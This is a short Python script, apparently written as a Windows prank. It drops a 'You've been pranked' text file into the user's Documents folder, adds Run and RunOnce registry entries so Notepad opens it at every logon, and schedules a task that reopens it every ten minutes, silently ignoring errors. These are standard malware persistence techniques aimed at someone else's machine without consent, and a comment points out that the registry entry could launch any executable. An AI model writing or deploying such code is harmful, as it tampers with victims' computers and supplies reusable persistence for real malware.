import os
import winreg as reg
import subprocess

def create_file():
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    file_path = os.path.join(documents_path, "prank.txt")
    with open(file_path, "w") as file:
        file.write("You've been pranked")
    print(file_path)

def add_to_startup():
    key1 = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    key2 = r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
    value_name = "GetPranked"
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    text_file_path = os.path.join(documents_path, "prank.txt")
    file_path = r"notepad.exe " + text_file_path  # Opens a file with Notepad - can run any executable (I think)
    
    try:
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key1, 0, reg.KEY_SET_VALUE) as reg_key:
            reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, file_path)
    except PermissionError:
        pass
    try:
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key2, 0, reg.KEY_SET_VALUE) as reg_key:
            reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, file_path)
    except PermissionError:
        pass

def schedule_task():
    task_name = "OpenPrankFile"
    documents_path = os.path.join(os.path.expanduser("~"), "Documents")
    file_path = os.path.join(documents_path, "prank.txt")
    interval = "MINUTE"
    repeat_interval = "10"

    command = [
        "schtasks", "/create", "/tn", task_name,
        "/tr", f'notepad.exe "{file_path}"',
        "/sc", interval, "/mo", repeat_interval,
        "/f"  # Force update if task already exists
    ]

    try:
        subprocess.run(command, check=True, shell=True)
    except subprocess.CalledProcessError as e:
        pass

if __name__ == "__main__":
    create_file()
    add_to_startup()
    schedule_task()